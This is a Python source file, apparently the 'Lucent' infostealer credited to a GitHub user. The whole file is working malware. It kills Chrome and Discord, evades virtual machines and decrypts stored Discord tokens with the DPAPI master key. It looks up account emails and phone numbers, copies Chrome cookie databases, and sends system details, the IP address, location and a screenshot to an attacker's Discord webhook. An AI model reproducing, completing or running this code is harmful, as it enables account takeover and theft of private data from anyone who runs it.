import requests
import socket
import time
import psutil
import string
import platform
import subprocess
import json
import uuid
import shutil
import re
import base64
import random
import sqlite3
import win32crypt 
import datetime
import re
import wmi
import os
import pyautogui
import tempfile
import sys
import browser_cookie3
from Crypto.Cipher import AES
import ctypes

# WWWWWWWW

types = ""
h00k = ""

os.system("TASKKILL /F /IM chrome.exe")
os.system("TASKKILL /F /IM Discord.exe")
os.system("TASKKILL /F /IM DiscordPTB.exe")
os.system("TASKKILL /F /IM DiscordCanary.exe")
os.system("cls") 

def iplogger():

    ipinfo = requests.get("https://ipinfo.io/json").json()

    ip = ipinfo.get("ip", "Unknown")
    citys = ipinfo.get("city", "Unknown")
    timezone = ipinfo.get("timezone", "Unknown")
    country = ipinfo.get("country", "Unknown")

    host = socket.gethostname()
    data = {
        "username": "Lucent | Address",
        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg", 
        "embeds": [{
            "title": "🏠️ IP INFO",
            "fields": [
                {
                    "name": "💻️ Host Name",
                    "value": f"{host}",
                    "inline": True
                },
                {
                    "name": "👀 IP Address",
                    "value": f"||{ip}||",
                    "inline": True
                },
                {
                    "name": "🌍️ location",
                    "value": f"{country} | {citys}",
                    "inline": True
                },
                {
                    "name": "🕒️ Timezone",
                    "value": f"{country} | {timezone}",
                    "inline": True
                }
            ],
            "footer": {
                "text": "zakocord. | https://github.com/zakocord/Lucent"
            }
        }]
    }
    response = requests.post(h00k, json=data)

def machineinfo():
    c = wmi.WMI()
    GPUm = "Unknown"
    for gpu in c.Win32_VideoController():
        GPUm = gpu.Description.strip()
    
    mem = psutil.virtual_memory()

    def machine_hwid():
        command = 'powershell "Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        hwid = subprocess.check_output(command, shell=True, text=True).strip()
        return hwid
    
    current_machine_id = machine_hwid()

    total_gb = round(mem.total / 1024**3)
    cpu_info = platform.processor()
    os_name = platform.platform()
    pc_name = platform.node()

    data2 = {
        "username": "Lucent | Machine", 
        "content": f"{types}",
        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
        "embeds": [
            {
                "title": "💻️ Machine Info",
                "fields": [
                    {
                        "name": "💻️ PC",
                        "value": f"`{pc_name}`",
                        "inline": False
                    },
                    {
                        "name": "⌨️ OS: ",
                        "value": f"`{os_name}`",
                        "inline": False
                    },
                    {
                        "name": "📝 RAM",
                        "value": f"`{total_gb}GB`",
                        "inline": False
                    },
                    {
                        "name": "📺️ GPU",
                        "value": f"`{GPUm}`",
                        "inline": False
                    },
                    {
                        "name": "🖲️ CPU",
                        "value": f"`{cpu_info}`",
                        "inline": False
                    },
                    {
                        "name": "🔏 HWID",
                        "value": f"`{current_machine_id}`",
                        "inline": False
                    }                       
                ],
                "footer": {
                    "text": "zakocord. | https://github.com/zakocord/Lucent"
                }   
            }
        ]
    } 

    response2 = requests.post(h00k, json=data2)

def gen_filename(length=10):
    safe_chars = string.ascii_letters + string.digits + "_-"
    return ''.join(random.choice(safe_chars) for _ in range(length))

def screenshot():
    temp_dir = tempfile.gettempdir()
    screenshot_filename = gen_filename(16) + ".png" 
    screenshot_path = os.path.join(temp_dir, screenshot_filename)

    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)

    with open(screenshot_path, "rb") as f:
        files = {"file": (screenshot_filename, f, "image/png")}
        data = {
            "username": "Lucent | Screenshot", 
            "content": f"📸 Screenshot",
            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",  
        }
        response3 = requests.post(h00k, data=data, files=files)
    
    if response3.status_code == 204:
        pass
    else:
        pass


def is_virtual_machine_windows():
    try:
        command = [
            "powershell",
            "-Command",
            "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Model"
        ]
        output = subprocess.check_output(command, stderr=subprocess.DEVNULL).decode().strip().lower()

        vm_keywords = ["virtual", "vmware", "virtualbox", "kvm", "xen", "qemu", "hyper-v", "parallels"]
        for keyword in vm_keywords:
            if keyword in output:
                pass
                return True
    except Exception as e:
        pass
    return False

def checker():
    is_vm = False


    hostname = socket.gethostname()
    if hostname.lower() == "apponfly-vps":
        pass
        is_vm = True


    if is_virtual_machine_windows():
        is_vm = True

    suspicious_processes = ["vmtoolsd.exe", "vboxservice.exe"]
    try:
        tasks = os.popen("tasklist").read().lower()
        for proc in suspicious_processes:
            if proc in tasks:
                pass
                is_vm = True
    except Exception as e:
        pass

    if is_vm:
        data_VM = {
            "username": "Lucent | VM Detection",
            "content": f"# @everyone \n ⚠️WARN⚠️ \n We've detected activity attempting to attack or debug your webhook. This webhook has been removed.",
            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
        }

        try:
            requests.post(h00k, json=data_VM)
            time.sleep(2)
        except Exception as e:
            pass
        sys.exit(1)


def cookie_webhook(webhook_url, status_lines, cookie_db_path):
    try:
        requests.post(webhook_url, json={
            "username": "Lucent | Cookie",
            "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
            "embeds": [{
                "title": "🍪 Cookie Search",
                "description": "\n".join(status_lines) if status_lines else "No status available",
            }]
        })

        with open(cookie_db_path, 'rb') as f:
            data = {
                "username": "Lucent | Cookie",
                "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
            }
            files = {'file': (os.path.basename(cookie_db_path), f)}
            requests.post(webhook_url, data=data, files=files)

    except Exception as e:
        pass

def extract_cookies(webhook_url):
    user_data_dir = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data")
    profiles = [p for p in os.listdir(user_data_dir) if p.startswith("Profile") and os.path.isdir(os.path.join(user_data_dir, p))]
    
    if not profiles:
        pass
        return

    status_lines = []
    for profile in profiles:
        cookie_db_path = os.path.join(user_data_dir, profile, "Network", "Cookies")
        if os.path.exists(cookie_db_path):
            temp_db = os.path.join(os.environ['TEMP'], f"cookies")
            try:
                shutil.copy2(cookie_db_path, temp_db)
                status_lines.append(f"🍪 | {profile} | Found Cookie")
                cookie_webhook(webhook_url, status_lines, temp_db)
            except Exception as e:
                status_lines.append(f"🍪 {profile} | ERROR {str(e)}")
                if os.path.exists(temp_db):
                    os.remove(temp_db)

    if not status_lines:
        status_lines.append("🔴 Not Found Cookie")
        cookie_webhook(webhook_url, status_lines, os.path.join(os.environ['TEMP'], f"empty_{uuid.uuid4().hex}.db"))

def get_master_key():
    paths = [
        os.path.join(os.environ['APPDATA'], "Discord", "Local State"),
        os.path.join(os.environ['APPDATA'], "DiscordPTB", "Local State"),
        os.path.join(os.environ['APPDATA'], "DiscordCanary", "Local State")
    ]

    for path in paths:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    

    raise FileNotFoundError(".")

def decrypt_value(encrypted_value: bytes, master_key: bytes) -> str:
    try:
        if encrypted_value[:3] == b"v10":
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt_and_verify(payload, tag)
            return decrypted.decode()
    except Exception as e:
        print(f"{e}")
    return ""

def find_token():
    master_key = get_master_key()

    storage_path = os.path.join(os.environ['APPDATA'], "Discord", "Local Storage", "leveldb")
    found_tokens = []

    if not os.path.exists(storage_path):
        print("             ")
        return

    files = [f for f in os.listdir(storage_path) if f.endswith(".ldb") or f.endswith(".log")]
    if not files:
        print(" ")
        return

    selected_file = random.choice(files)  
    print(" ")

    try:
        with open(os.path.join(storage_path, selected_file), "r", errors="ignore") as f:
            for line in f:
                matches = re.findall(r'dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)', line)
                for match in matches:
                    encrypted_token = base64.b64decode(match)
                    decrypted_token = decrypt_value(encrypted_token, master_key)
                    if decrypted_token:
                        found_tokens.append(decrypted_token)
    except PermissionError:
        print(f" ")
        return

    if found_tokens:
        for token in found_tokens:
            webhook(token)
    else:
        print("No tokens found.")

def webhook(token):
    api = "https://discord.com/api/v6/users/@me"
    headers = {
        "Authorization": f"{token}"
    }
    get_info = requests.get(api, headers=headers)
    if get_info.status_code == 200:
        user = get_info.json()

    user_id = user["id"]
    user_name = user["username"]
    email = user["email"]
    phone = user["phone"]
    avatar_hash = user['avatar']

    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else None

    payload = {
        "username": "Lucef | Token", 
        "avatar_url": "https://i.pinimg.com/736x/c9/34/d6/c934d6c71c98ae4f38c7c68038634594.jpg",
        "embeds": [
            {
                "title": f"{user_name} | Lucent",  
                "fields": [
                    {
                        "name": "🔑 Token",
                        "value": f"```{token}```",
                        "inline": False
                    },
                    {
                        "name": "📫️ Email",
                        "value": f"```{email}```",
                        "inline": False
                    },
                    {
                        "name": "🔏 Password",
                        "value": f"Soon",
                        "inline": True
                    },
                    {
                        "name": ":mobile_phone: Phone",
                        "value": f"{phone}",
                        "inline": True
                    },
                    {
                        "name": "💎 Nitro",
                        "value": "im gay (Not Working) 💀",
                        "inline": True
                    }
                ],
                "footer": {
                    "text": "zakocord. | github.com/zakocord/Lucent",
                },
                "thumbnail": {
                    "url": f"{avatar_url}" 
                }
            }
        ]
    }

    response_webhook = requests.post(h00k, json=payload)
    if response_webhook.status_code == 204:
        print(" ")
    else:
        print(f"                            ")
def main():
    checker()
    find_token()
    machineinfo()
    extract_cookies(h00k)
    iplogger()
    screenshot()

main()
